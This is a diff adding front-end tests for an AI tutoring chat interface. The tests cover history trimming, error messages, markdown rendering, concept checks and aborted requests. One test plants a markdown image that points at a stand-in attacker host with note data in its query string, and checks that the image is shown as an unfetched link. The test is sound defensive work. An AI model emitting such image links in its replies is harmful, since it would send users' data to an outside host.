@@ -213,3 +213,92 @@ describe("the topic tutor's recall card", () => {
     expect(card(host)!.querySelector("[data-recorded]")?.textContent).toContain("Dot product");
   });
 });
+
+/** Type a message in the composer and send it with Enter. */
+async function say(host: HTMLElement, text: string) {
+  const composer = [...host.querySelectorAll("textarea")].at(-1)!;
+  await type(composer, text);
+  await act(async () => {
+    composer.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
+  });
+  await settle();
+}
+
+describe("a long topic session", () => {
+  it("keeps sending past the route's bounds: each turn carries the newest part that fits, and the recap does too", async () => {
+    replies = [];
+    const host = await mount();
+    await click(button(host, "Start Socratic dialogue"));
+    // Twenty-four exchanges of about 600 characters a side: 49 turns, some 29000 characters.
+    for (let at = 0; at < 24; at += 1) {
+      replies.push({ content: `Reply ${at} `.repeat(60) });
+      await say(host, `Question ${at} `.repeat(50));
+    }
+    const last = chats().at(-1)!.body.messages as Array<{ role: string; content: string }>;
+    expect(last.length).toBeLessThanOrEqual(40);
+    expect(last.reduce((n, m) => n + m.content.length, 0)).toBeLessThanOrEqual(24_000);
+    expect(last[0].role).toBe("user");
+    expect(last.at(-1)?.content).toContain("Question 23");
+
+    await click(button(host, "Save session recap"));
+    const recap = fetched.find((c) => c.url === "/api/agent/summarize")!.body.messages as Array<{ content: string }>;
+    expect(recap.length).toBeLessThanOrEqual(40);
+    expect(recap.reduce((n, m) => n + m.content.length, 0)).toBeLessThanOrEqual(24_000);
+  });
+});
+
+describe("the topic tutor's thread", () => {
+  it("says what failed when the server answers with no JSON body", async () => {
+    vi.stubGlobal("fetch", vi.fn(async () => new Response("<html>Bad gateway</html>", { status: 504 })));
+    const host = await mount();
+    await click(button(host, "Start Socratic dialogue"));
+    const alert = host.querySelector('[role="alert"]');
+    expect(alert?.textContent).toContain("The tutor did not answer (HTTP 504).");
+    expect(alert?.textContent).not.toContain("undefined");
+    expect(alert?.textContent).not.toContain("Unexpected token");
+  });
+
+  it("announces replies, renders the tutor's markdown, and shows a markdown image as a link it does not fetch", async () => {
+    replies = [{ content: "Softmax is **positive**.\n\n![leak](https://attacker.example/p.png?d=notes)" }];
+    const host = await mount();
+    await click(button(host, "Start Socratic dialogue"));
+    const thread = host.querySelector('[aria-live="polite"]');
+    expect(thread).not.toBeNull();
+    expect(thread?.querySelector("strong")?.textContent).toBe("positive");
+    expect(thread?.textContent).not.toContain("**");
+    expect(host.querySelector("img")).toBeNull();
+    expect(thread?.querySelector('a[href^="https://attacker.example/"]')?.textContent).toBe("leak");
+  });
+
+  it("names the concept a prose check recorded against, as a card check's row does", async () => {
+    replies = [{ content: "Try one.", check: { question: "What does softmax output?", concept: "softmax" } }, { content: "Yes." }];
+    const host = await mount();
+    await click(button(host, "Start Socratic dialogue"));
+    await say(host, "A probability distribution.");
+    await click(button(host, "Record as correct"));
+    const recorded = host.querySelector<HTMLElement>("[data-recorded]");
+    expect(recorded?.textContent).toContain("Softmax");
+    expect(recorded?.querySelector("a")?.getAttribute("href")).toBe("/learn/softmax");
+  });
+
+  it("drops a reply that lands after the page went away", async () => {
+    let answer: (r: Response) => void = () => {};
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(
+        (_url: string, init?: RequestInit) =>
+          new Promise<Response>((resolve, reject) => {
+            answer = resolve;
+            init?.signal?.addEventListener("abort", () => reject(init.signal?.reason), { once: true });
+          }),
+      ),
+    );
+    const host = await mount();
+    await act(async () => button(host, "Start Socratic dialogue")!.click());
+    const signal = (vi.mocked(fetch).mock.calls[0][1] as RequestInit).signal!;
+    mounted.pop()?.();
+    expect(signal.aborted).toBe(true);
+    answer(new Response(JSON.stringify({ message: { content: "Too late." } }), { status: 200 }));
+    await settle();
+  });
+});
